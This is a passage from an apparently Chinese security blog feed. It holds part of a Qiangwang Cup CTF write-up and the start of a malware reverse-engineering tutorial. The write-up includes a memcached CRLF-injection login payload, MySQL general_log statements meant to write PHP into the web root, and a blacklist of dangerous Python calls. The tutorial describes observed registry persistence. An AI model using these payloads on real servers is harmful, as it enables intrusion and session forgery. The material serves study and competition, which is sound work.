<span class="token string">'os'</span><span class="token punctuation">,</span>    <span class="token string">'popen'</span><span class="token punctuation">,</span>    <span class="token string">'exec'</span><span class="token punctuation">,</span>    <span class="token string">'eval'</span><span class="token punctuation">,</span>    <span class="token string">'posix'</span><span class="token punctuation">,</span>     <span class="token string">'spawn'</span><span class="token punctuation">,</span>    <span class="token string">'compile'</span><span class="token punctuation">,</span>    <span class="token string">'code'</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>    otoken <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span>    token <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>otoken<span class="token punctuation">,</span> ensure_ascii<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> keyword <span class="token keyword">in</span> BLACKLIST<span class="token punctuation">:</span>        <span class="token keyword">if</span> keyword <span class="token keyword">in</span> token<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">,</span> title<span class="token operator">=</span><span class="token string">'Home'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">login</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    username <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span>    password <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'password'</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> user <span class="token keyword">in</span> users<span class="token punctuation">:</span>        <span class="token keyword">if</span> user<span class="token punctuation">.</span>username <span class="token operator">==</span> username <span class="token keyword">and</span> user<span class="token punctuation">.</span>password <span class="token operator">==</span> password<span class="token punctuation">:</span>            res <span class="token operator">=</span> app<span class="token punctuation">.</span>make_response<span class="token punctuation">(</span><span class="token string">'Login successful'</span><span class="token punctuation">)</span>            token <span class="token operator">=</span> Token<span class="token punctuation">(</span>username<span class="token punctuation">,</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            res<span class="token punctuation">.</span>status_code <span class="token operator">=</span> <span class="token number">302</span>            res<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>jsonpickle<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            res<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Location'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'/home'</span>            <span class="token keyword">return</span> res    <span class="token keyword">return</span> <span class="token string">'Invalid credentials (guest/guest)'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        jtoken <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>        token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jtoken<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Welcome </span><span class="token interpolation"><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>username<span class="token punctuation">&#125;</span></span><span class="token string">, but you are not admin'</span></span>            <span class="token keyword">return</span> <span class="token string">'Welcome admin, there is something in /s3Cr3T'</span>    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/s3Cr3T'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">secret</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> token<span class="token punctuation">:</span>        jtoken <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64decode<span class="token punctuation">(</span>token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> waf<span class="token punctuation">(</span>jtoken<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>        token <span class="token operator">=</span> jsonpickle<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>jtoken<span class="token punctuation">,</span> safe<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> token<span class="token punctuation">.</span>timestamp <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> token<span class="token punctuation">.</span>username <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token string">'Invalid token'</span>            <span class="token keyword">return</span> <span class="token triple-quoted-string string">'''if not waf(token):    return 'Invalid token'token = jsonpickle.decode(token, safe=True)if time() - token.timestamp &lt; 60:    if token.username != 'admin':        return f'Welcome &#123;token.username&#125;, but you are not admin'    return 'Welcome admin, there is something in /s3Cr3T'return 'Invalid token''''</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'Invalid token'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样的方法用 &#x2F;readflag 读取flag即可</p><hr><h2 id="anniversary（0-Solved）"><a href="#anniversary（0-Solved）" class="headerlink" title="anniversary（0 Solved）"></a>anniversary（0 Solved）</h2><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206100717732.png" alt="image-20241206100717732"></p><p><img src="/blog/2024/12/05/%E5%BC%BA%E7%BD%91%E6%9D%AFS8-Final/image-20241206101144441.png" alt="image-20241206101144441"></p><p>观察渲染格式，这里是<code>方法 参数</code>的形式</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">text</span><span class="token operator">:</span> <span class="token string">'距离纪念日还有 &#123;&#123;anniversary_time_diff t=1736006400000 l=\"cn\"&#125;&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>测试报错：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Error<span class="token punctuation">:</span> Invalid time valueTypeError<span class="token punctuation">:</span> Cannot destructure <span class="token builtin">property</span> <span class="token string">'hash'</span> of <span class="token string">'arguments[0]'</span> <span class="token keyword">as</span> it <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>TypeError<span class="token punctuation">:</span> Cannot destructure <span class="token builtin">property</span> <span class="token string">'t'</span> of <span class="token string">'hash'</span> <span class="token keyword">as</span> it <span class="token keyword">is</span> undefined<span class="token punctuation">.</span>RangeError<span class="token punctuation">:</span> Invalid time value<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>hint：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">提示：1. 尝试探测服务端渲染模版的组件及其版本2. anniversary_time_diff无法利用3. 尝试发现其他模版可以访问的函数/变量4. 尝试利用模版渲染组件本身的漏洞实现RCE5. 尝试类型混淆<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测不出来，什么nodejs模板会只渲染<code>&#123;&#123;&#125;&#125;</code>，<code>[]</code>能返回一个 object 啊</p><br><p>可能的模板：</p><p>Handlebars：<a href="https://xz.aliyun.com/news/4327">https://xz.aliyun.com/news/4327</a></p><hr><h1 id="RW"><a href="#RW" class="headerlink" title="RW"></a>RW</h1><h2 id="TS-（Unsolved）"><a href="#TS-（Unsolved）" class="headerlink" title="TS++（Unsolved）"></a>TS++（Unsolved）</h2><p>thinkshop 还在追我</p><p>和 thinkshopping 一样的操作打 memcached 进后台</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/public/index.php/index/admin/do_login.html</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:36000</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span><span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span><span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">PHPSESSID=gan31bc5bm4k4jn9v7npb878g6</span></span><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">255</span></span>username=admin%00%0D%0Aset%20think%3Ashop.admin%7Cadmin%204%20500%20101%0D%0Aa%3A3%3A%7Bs%3A2%3A%22id%22%3Bi%3A1%3Bs%3A8%3A%22username%22%3Bs%3A5%3A%22admin%22%3Bs%3A8%3A%22password%22%3Bs%3A32%3A%2221232f297a57a5a743894a0e4a801fc3%22%3B%7D&amp;password=admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样子账密 admin:admin 进后台</p><p>但是 secure_file_priv 为 <code>/var/lib/mysql-files/</code>，不能读文件了</p><p>总之 diff 看一下和上一代比有哪些变化吧</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">diff</span> <span class="token parameter variable">-rq</span> web1 web2Files web1/application/index/model/Goods.php and web2/application/index/model/Goods.php differFiles web1/application/index/view/admin/goods_add.html and web2/application/index/view/admin/goods_add.html differFiles web1/application/index/view/admin/goods_edit.html and web2/application/index/view/admin/goods_edit.html differFiles web1/application/index/view/index/goods.html and web2/application/index/view/index/goods.html differ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对比了一下，goods_edit.html 和 goods.html 里多了个 base64 解码，Goods.php 删掉了后面一串用不上的代码</p><p>sql 里仍有<code>(1, &#39;admin&#39;, &#39;e10adc3949ba59abbe56e057f20f883e&#39;);</code>，也就是说可以<code>1:123456</code>进后台</p><p>那么唯一的问题就是我们现在只有sql注入，写不了shell</p><p>感觉还是要从 memcached CRLF 入手</p><p>尝试写日志</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">show variables like &#39;%general%&#39;;set global general_log &#x3D; on;set global general_log_file &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;public&#x2F;info.php&#39;;select &#39;&lt;?php phpinfo();?&gt;&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>本地容器终端上测试能写，但是权限不够访问，遂放弃注入</p><p>最后想了下，既然我们能往 memcached 里面写入序列化字符串，那么也可以直接把 poc 的序列化字符串进行反序列化</p><p>然后就搜到了这个：<a href="https://zhcy2018.github.io/2023/%E5%BC%BA%E7%BD%91%E6%9D%AF%20thinkshopping.html">https://zhcy2018.github.io/2023/%E5%BC%BA%E7%BD%91%E6%9D%AF%20thinkshopping.html</a></p><p>但是来不及了，没来得及多研究就架上台去尝试了，然后翻车了XD</p><hr><h1 id="游记（to-be-continued）"><a href="#游记（to-be-continued）" class="headerlink" title="游记（to be continued）"></a>游记（to be continued）</h1><p>三天的强网梦结束了，归来依旧是个臭双非的学生，写个锤子游记，ddl赶不完了，等肝完ddl再说 —— 2024.12.8</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;我大概一辈子都忘不了强网杯了吧&lt;/p&gt;</summary>
    
    
    
    <category term="线下赛" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒木马样本逆向</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/</id>
    <published>2024-12-03T16:05:04.000Z</published>
    <updated>2024-12-12T02:29:22.384Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>🐎</p><span id="more"></span><hr><h1 id="简单病毒逆向分析"><a href="#简单病毒逆向分析" class="headerlink" title="简单病毒逆向分析"></a>简单病毒逆向分析</h1><p>电脑病毒（computer virus），或称电子计算机病毒。是一种在人为或非人为的情况下产生的、在用户不知情或未批准下，能自我复制或运行的电脑程序；电脑病毒往往会影响受感染电脑的正常运作，或是被控制而不自知，电脑正常运作仅盗窃资料、或者被利用做其他用途等用户非自发启动的行为。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ul><li>针对病毒的简单分析</li><li>掌握发现病毒后的各类操作</li></ul><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数据源准备"><a href="#数据源准备" class="headerlink" title="数据源准备"></a>数据源准备</h3><ul><li><p>病毒文件基本信息：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">文件名：35a7db3cde6c0744dc2146f23f499df8ad527c93大小：229 KB (234,496 字节)CRC32：7E28EBC8MD5：324B6AB5E45E2A106025BE8802D39511SHA-1：35A7DB3CDE6C0744DC2146F23F499DF8AD527C93<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>查壳程序：本次通过 <strong>Exeinfo PE</strong> 来进行查询，该软件目前内置海量 PEiD 的签名库并整合了近 50 种插件以及更加完整的中文语言包，具备非常强悍的可鉴定多种文件类别的能力，全面兼容包括bmp、.jpg、.mov、.mp4、.vpx、.crx、.skn、.dcu、.obj、.ice、.apk、.TLB、.ddd、.dcu、.pkg、.mkv、.WebM、.iso、.xar、.nup、.vhd、.tar、.gma、.mts、res、tiff、7z、rar 在内的多种文件格式，支持查看加密程序的 PE 信息、编译信息、是否加壳、输入输出表、入口地址、首字节、文件大小、子系统与覆盖等任何可执行程序的多种相关信息，给予用户引导脱壳方法</p></li><li><p>脱壳工具：<strong>XVolkolak</strong> 是一个功能强大的通用 shelling 实用程序，带有虚拟机。它旨在帮助用户快速解决各种加密 shell。与其他 shelling 工具不同，它使用虚拟机脱壳技术。避免损坏用户系统，同时使用 XVolkolak，还可以执行 PE 编辑，数据扫描检测和快速 shell 检查操作，支持拖放操作，易于使用</p></li></ul><h3 id="病毒分析"><a href="#病毒分析" class="headerlink" title="病毒分析"></a>病毒分析</h3><p>查壳：</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241204104144941.png" alt="image-20241204104144941"></p><p>有壳，是 MPRESS，同时查看到文件是 PE 文件，使用 XVolkolak 进行脱壳</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241204104429569.png" alt="image-20241204104429569"></p><p>脱壳完毕后生成一个 .unp 文件，拖入 OD 在入口点处，可以看到各项功能显示正常，说明脱壳成功</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241204105705591.png" alt="image-20241204105705591"></p><p>通过火绒剑识别病毒行为进行分析，将未脱壳的源文件改为：1.exe</p><p>将病毒 exe 拖动到火绒剑窗口当中（需关闭火绒防护）</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211111245535.png" alt="image-20241211111245535"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211111437251.png" alt="image-20241211111437251"></p><p>病毒首先 PROC_exec 打开并创建了一个 conhost.exe 进程，接着在 C:\Program File 新建了 Microsoft DN1 文件</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211111544688.png" alt="image-20241211111544688"></p><p>FILE_touch 新建了 images.exe 文件，并启动自释放文件。REG_setval 设置 images.exe 为开机启动项</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211112024954.png" alt="image-20241211112024954"></p><p>接着进程 1.exe 结束，执行了 powershell.exe ，然后 images.exe 在 Windows\CurrentVersion\Explorer\ 下新建了一个键值 ADDEJIWOQK，并设置了一个注册表项值 inst</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211113810367.png" alt="image-20241211113810367"></p><p>最底下可以看到远程连接的服务器ip和端口</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211114057881.png" alt="image-20241211114057881"></p><hr><h1 id="文件夹木马病毒样本逆向分析"><a href="#文件夹木马病毒样本逆向分析" class="headerlink" title="文件夹木马病毒样本逆向分析"></a>文件夹木马病毒样本逆向分析</h1><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>Windows 虚拟机</p><p>沙箱、Exeinfo PE 等</p><hr><h2 id="步骤-1"><a href="#步骤-1" class="headerlink" title="步骤"></a>步骤</h2><h3 id="云沙箱分析"><a href="#云沙箱分析" class="headerlink" title="云沙箱分析"></a>云沙箱分析</h3><p>关闭杀毒软件，在虚拟机中解压病毒，使用在线云沙箱进行文件解析</p><p>安恒云沙箱：<a href="https://sandbox.dbappsecurity.com.cn/">https://sandbox.dbappsecurity.com.cn</a></p><p>微步云沙箱：<a href="https://s.threatbook.com/">https://s.threatbook.com</a></p><p>这里使用安恒云沙箱，首先访问网站，将病毒文件上传至平台</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211172208565.png" alt="image-20241211172208565"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211172358984.png" alt="image-20241211172358984"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211172510575.png" alt="image-20241211172510575"></p><ol><li><p>确认病毒的信息后，我们使用第二个工具。由 Windows 自带的 certutil -hashfile</p><blockquote><p>certutil -hashfile 是一个在 Windows 操作系统中非常有用的命令行工具，它用于计算文件的哈希值。哈希值是一个固定长度的字符串，它代表了文件内容的数字指纹。即使文件内容发生微小变化，其哈希值也会发生显著变化。这使得哈希值成为验证文件完整性和一致性的理想工具</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">certutil <span class="token parameter variable">-hashfile</span> 文件地址 MD5certutil <span class="token parameter variable">-hashfile</span> 文件地址 SHA1certutil <span class="token parameter variable">-hashfile</span> 文件地址 SHA256<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211173549416.png" alt="image-20241211173549416"></p></li></ol><h3 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h3><p>基础信息分析完成后，通过 Exeinfo PE 来进行查壳</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211173629109.png" alt="image-20241211173629109"></p><p>无壳，用 Delphi 写的</p><h3 id="Delphi-分析"><a href="#Delphi-分析" class="headerlink" title="Delphi 分析"></a>Delphi 分析</h3><p>通过 DeDe 查看 Delphi 程序窗体属性</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211173931879.png" alt="image-20241211173931879"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211174048042.png" alt="image-20241211174048042"></p><p>通过 DeDe 分析工具我们可以看到，这个病毒程序由五个功能模块组成的，分别为 FromCreate、Timer1Timer、Timer2Timer、Timer3Timer、Timer4Timer，其中 FromCreate 类似于程序的入口函数（main），剩下 4 个是个定时器函数</p><h3 id="检测依赖关系"><a href="#检测依赖关系" class="headerlink" title="检测依赖关系"></a>检测依赖关系</h3><p>通过 depends 工具来检测依赖关系：</p><p>查询 Windows 应用开发文档：<a href="https://learn.microsoft.com/zh-cn/windows/apps/">https://learn.microsoft.com/zh-cn/windows/apps/</a></p><p>通过 Depends 检测可以发现这个病毒调用了很多注册表操作和文件操作，例如</p><pre class="line-numbers language-none"><code class="language-none">RegOpenKeyExA()RegSetValueExA()WriteFile()CreateFileA()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211174802612.png" alt="image-20241211174802612"></p><h3 id="火绒剑分析"><a href="#火绒剑分析" class="headerlink" title="火绒剑分析"></a>火绒剑分析</h3><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211192827482.png" alt="image-20241211192827482"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211192905935.png" alt="image-20241211192905935"></p><p>病毒创建了名为 avb.exe、javasc.exe 的恶意文件，路径如图所示，打开文件路径可以观察到这些恶意文件</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211193115969.png" alt="image-20241211193115969"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211193246612.png" alt="image-20241211193246612"></p><p>继续观察，可以发现大量的注册表操作，avb.exe 写入自启动注册表：</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211193540797.png" alt="image-20241211193540797"></p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211193947341.png" alt="image-20241211193947341"></p><p>禁用显示隐藏文件和文件夹的选项，以隐藏自身：</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211194120071.png" alt="image-20241211194120071"></p><h3 id="IDA静态分析"><a href="#IDA静态分析" class="headerlink" title="IDA静态分析"></a>IDA静态分析</h3><p>Delphi 函数参考库：<a href="http://docwiki.embarcadero.com/Libraries/Sydney/en/Main_Page">http://docwiki.embarcadero.com/Libraries/Sydney/en/Main_Page</a></p><p>函数入口点</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211204741892.png" alt="image-20241211204741892"></p><p>f5反编译</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211205242848.png" alt="image-20241211205242848"></p><p>调用 Forms::TApplication 类的 CreateForm 方法，传入 off_450FD0[0] 指向的值、off_44E76C 和 off_4510B0，跟进 off_44E76C 函数：</p><p><img src="/blog/2024/12/04/%E7%97%85%E6%AF%92%E6%9C%A8%E9%A9%AC%E6%A0%B7%E6%9C%AC%E9%80%86%E5%90%91/image-20241211205915941.png" alt="image-20241211205915941"></p><p>跟进 word_44E8F3</p><p><img 